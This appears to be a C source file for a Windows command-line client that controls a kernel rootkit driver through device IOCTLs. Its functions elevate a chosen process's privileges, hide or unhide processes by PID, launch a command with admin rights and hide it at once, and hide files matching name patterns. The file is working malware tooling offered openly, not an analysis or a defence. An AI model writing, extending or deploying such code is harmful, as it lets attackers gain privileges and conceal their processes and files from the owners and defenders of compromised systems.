#define WIN32_LEAN_AND_MEAN
#include "companion.h"
#include <Windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <winioctl.h>
#include "shared/rootkit_uapi.h"

// Start a process with the specified command line and wait for it to finish if bWait is TRUE
// Return the exit code of the process if bWait is TRUE, otherwise the new process ID
DWORD StartProcess(IN LPSTR lpCmd, IN DWORD dwCreationFlags, IN BOOL bWait) {
    DWORD dwExitCode = 0;
    DWORD dwPid = 0;
    STARTUPINFO si = {0};
    PROCESS_INFORMATION pi = {0};

    si.cb = sizeof(si);
    if (!CreateProcess(NULL, lpCmd, NULL, NULL, FALSE, dwCreationFlags, NULL, NULL, &si, &pi)) {
        PrintError("CreateProcess failed");
        return -1;
    }

    dwPid = pi.dwProcessId;
    printf("Process started with PID: %ld\n", dwPid);
    if (bWait) {
        printf("Waiting for process to exit...\n");
        WaitForSingleObject(pi.hProcess, INFINITE);
        if (!GetExitCodeProcess(pi.hProcess, &dwExitCode)) {
            PrintError("GetExitCodeProcess failed");
            dwExitCode = -1;
        }
    }

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return bWait ? dwExitCode : dwPid;
}

int main(int argc, char* argv[]) {
    int ret = ERROR_SUCCESS;

    if (argc < 2) {
        printf("Usage: %s <function> [args]\n", argv[0]);
        putchar('\n');
        puts("Available functions:");
        puts("  " S_ROOT_PID " <pid> - Elevate a process by PID");
        puts("  " S_HIDE_PID " <pid> - Hide a process by PID");
        puts("  " S_SHOW_PID " <pid> - Show a previously hidden process");
        puts("  " S_START_PROCESS
             " <cmdline> - Start a new process with admin privileges and hide it immediately");
        puts("  " S_HIDE_FILE
             " <exact|substring|prefix|suffix> <pattern> - Hide files matching 'pattern'");
        puts("  " S_SHOW_FILE
             " <exact|substring|prefix|suffix> <pattern> - Remove pattern from hidden file list");
        putchar('\n');
        printf("PID %ld refers to the current process\n", PID_SELF);
        printf("PID %ld refers to the parent process\n", PID_PARENT);
        putchar('\n');
        puts("Pattern matching types:");
        puts("  exact - Match the entire string");
        puts("  substring - Match anywhere in the string");
        puts("  prefix - Match the beginning of the string");
        puts("  suffix - Match the end of the string");
        ret = ERROR_INVALID_PARAMETER;
        goto ret;
    }

    CONST LPCSTR sArg1 = argv[1];
    FUNCTION function = FN_INVALID;

    if (CHECK_ARG(sArg1, S_ROOT_PID)) {
        function = FN_ROOT_PID;
    } else if (CHECK_ARG(sArg1, S_HIDE_PID)) {
        function = FN_HIDE_PID;
    } else if (CHECK_ARG(sArg1, S_SHOW_PID)) {
        function = FN_SHOW_PID;
    } else if (CHECK_ARG(sArg1, S_START_PROCESS)) {
        function = FN_START_PROCESS;
    } else if (CHECK_ARG(sArg1, S_HIDE_FILE)) {
        function = FN_HIDE_FILE;
    } else if (CHECK_ARG(sArg1, S_SHOW_FILE)) {
        function = FN_SHOW_FILE;
    } else {
        printf("Unknown function: %s\n", sArg1);
        ret = ERROR_INVALID_PARAMETER;
        goto ret;
    }

    CONST HANDLE hDevice = CreateFileW(L"\\\\.\\" DEV_NAME, GENERIC_WRITE | GENERIC_READ,
                                       FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING,
                                       FILE_ATTRIBUTE_SYSTEM, 0);
    if (hDevice == INVALID_HANDLE_VALUE) {
        PrintError("Failed to open device");
        ret = ERROR_OPEN_FAILED;
        goto ret;
    }

    DWORD dwBytesReturned = 0;

    printf("My PID: %ld\n", GetCurrentProcessId());

    LONG lPid = PID_SELF;
    BOOL status;

    switch (function) {
        case FN_ROOT_PID: {
            if (argc != 3) {
                printf("Usage: %s %s <pid>\n", argv[0], sArg1);
                ret = ERROR_INVALID_PARAMETER;
                goto close_dev;
            }

            lPid = atol(argv[2]);
            if (lPid < -1 || lPid == LONG_MAX) {
                printf("Invalid PID: %s\n", argv[2]);
                ret = ERROR_INVALID_PARAMETER;
                goto close_dev;
            }

            if (lPid == PID_SELF) {
                printf("Current process privileges:\n");
                StartProcess("whoami /user /priv", 0, TRUE);
                putchar('\n');
                printf("Elevating current process...\n");
            } else if (lPid == PID_PARENT) {
                printf("Elevating parent process...\n");
            } else {
                printf("Elevating PID: %ld...\n", lPid);
            }

            status = DeviceIoControl(hDevice, IOCTL_ROOT_PID, &lPid, sizeof(lPid), NULL, 0,
                                     &dwBytesReturned, NULL);
            if (!status) {
                PrintIoctlError();
                ret = ERROR_IO_DEVICE;
                goto close_dev;
            }

            if (lPid == PID_SELF) {
                printf("New privileges:\n");
                StartProcess("whoami /user /priv", 0, TRUE);
            }
            break;
        }

        case FN_HIDE_PID:
        case FN_SHOW_PID: {
            if (argc != 3) {
                printf("Usage: %s %s <pid>\n", argv[0], sArg1);
                ret = ERROR_INVALID_PARAMETER;
                goto close_dev;
            }

            lPid = atol(argv[2]);
            if (lPid < -1 || lPid == LONG_MAX) {
                printf("Invalid PID: %s\n", argv[2]);
                ret = ERROR_INVALID_PARAMETER;
                goto close_dev;
            }

            printf("%s PID: %ld...\n", function == FN_HIDE_PID ? "Hiding" : "Showing", lPid);
            status =
                DeviceIoControl(hDevice, function == FN_HIDE_PID ? IOCTL_HIDE_PID : IOCTL_SHOW_PID,
                                &lPid, sizeof(lPid), NULL, 0, &dwBytesReturned, NULL);
            if (!status) {
                PrintIoctlError();
                ret = ERROR_IO_DEVICE;
                goto close_dev;
            }
            break;
        }

        case FN_START_PROCESS: {
            if (argc != 3) {
                printf("Usage: %s %s <cmdline>\n", argv[0], sArg1);
                ret = ERROR_INVALID_PARAMETER;
                goto close_dev;
            }

            LPSTR lpCmd = argv[2];

            printf("Getting admin privileges for current process...\n");
            status = DeviceIoControl(hDevice, IOCTL_ROOT_PID, &lPid, sizeof(lPid), NULL, 0,
                                     &dwBytesReturned, NULL);
            if (!status) {
                PrintIoctlError();
                ret = ERROR_IO_DEVICE;
                goto close_dev;
            }

            printf("Starting process: '%s'...\n", lpCmd);
            lPid = (LONG)StartProcess(lpCmd, CREATE_NEW_CONSOLE, FALSE);
            if (lPid <= 0) {
                ret = GetLastError();
                goto close_dev;
            }

            printf("Hiding PID: %ld...\n", lPid);
            status = DeviceIoControl(hDevice, IOCTL_HIDE_PID, &lPid, sizeof(lPid), NULL, 0,
                                     &dwBytesReturned, NULL);
            if (!status) {
                PrintIoctlError();
                ret = ERROR_IO_DEVICE;
                goto close_dev;
            }
            break;
        }

        case FN_HIDE_FILE:
        case FN_SHOW_FILE: {
            if (argc != 4) {
                printf("Usage: %s %s <exact|substring|prefix|suffix> <pattern>\n", argv[0], sArg1);
                ret = ERROR_INVALID_PARAMETER;
                goto close_dev;
            }

            CONST LPCSTR sArg2 = argv[2];

            MATCH_TYPE matchType;
            if (CHECK_ARG(sArg2, "exact")) {
                matchType = MATCH_TYPE_EXACT;
            } else if (CHECK_ARG(sArg2, "substring")) {
                matchType = MATCH_TYPE_SUBSTRING;
            } else if (CHECK_ARG(sArg2, "prefix")) {
                matchType = MATCH_TYPE_PREFIX;
            } else if (CHECK_ARG(sArg2, "suffix")) {
                matchType = MATCH_TYPE_SUFFIX;
            } else {
                printf("Unknown pattern matching type: %s\n", sArg2);
                ret = ERROR_INVALID_PARAMETER;
                goto close_dev;
            }

            HIDDEN_FILE hiddenFile = {0};
            CONST LPCSTR sPatternA = argv[3];
            CONST SIZE_T szPatternLength = strlen(sPatternA);
            if (szPatternLength == 0 || szPatternLength > ARRAYSIZE(hiddenFile.FileName)) {
                printf("Invalid pattern length: %zu (must be between 1 and %zu)\n", szPatternLength,
                       ARRAYSIZE(hiddenFile.FileName));
                ret = ERROR_INCORRECT_SIZE;
                goto close_dev;
            }
            printf("Original pattern length (ASCII): %zu\n", szPatternLength);

            size_t szConvertedLength = mbstowcs(NULL, sPatternA, szPatternLength);
            if (szConvertedLength == (size_t)-1) {
                PrintError("Failed to convert pattern to wide string");
                ret = ERROR_INVALID_PARAMETER;
                goto close_dev;
            }
            printf("Converted pattern length (UTF-16): %zu\n", szConvertedLength);
            CONST LPWSTR wsPatternW = (LPWSTR)malloc(szConvertedLength * sizeof(WCHAR));
            if (wsPatternW == NULL) {
                PrintError("Failed to allocate memory for pattern");
                ret = ERROR_OUTOFMEMORY;
                goto close_dev;
            }
            if (mbstowcs(wsPatternW, sPatternA, szPatternLength) == (size_t)-1) {
                PrintError("Failed to convert pattern to wide string");
                ret = ERROR_INVALID_PARAMETER;
                goto pattern_free;
            }

            printf("Pattern after wide conversion: %.*ws\n", (int)szConvertedLength, wsPatternW);

            hiddenFile.FileNameLength = (ULONG)szConvertedLength;
            hiddenFile.MatchType = matchType;
            wcsncpy_s(hiddenFile.FileName, ARRAYSIZE(hiddenFile.FileName), wsPatternW,
                      szConvertedLength);

            printf("%s pattern: %.*ws...\n", function == FN_HIDE_FILE ? "Hiding" : "Showing",
                   (int)hiddenFile.FileNameLength, hiddenFile.FileName);
            status = DeviceIoControl(
                hDevice, function == FN_HIDE_FILE ? IOCTL_HIDE_FILE : IOCTL_SHOW_FILE, &hiddenFile,
                sizeof(hiddenFile), NULL, 0, &dwBytesReturned, NULL);
            if (!status) {
                PrintIoctlError();
                ret = ERROR_IO_DEVICE;
                goto pattern_free;
            }
            printf("Pattern %s successfully\n", function == FN_HIDE_FILE ? "hidden" : "removed");

        pattern_free:
            free(wsPatternW);
            break;
        }
    }

close_dev:
    CloseHandle(hDevice);

    // puts("Press any key to exit...");
    // getchar();

ret:
    return ret;
}
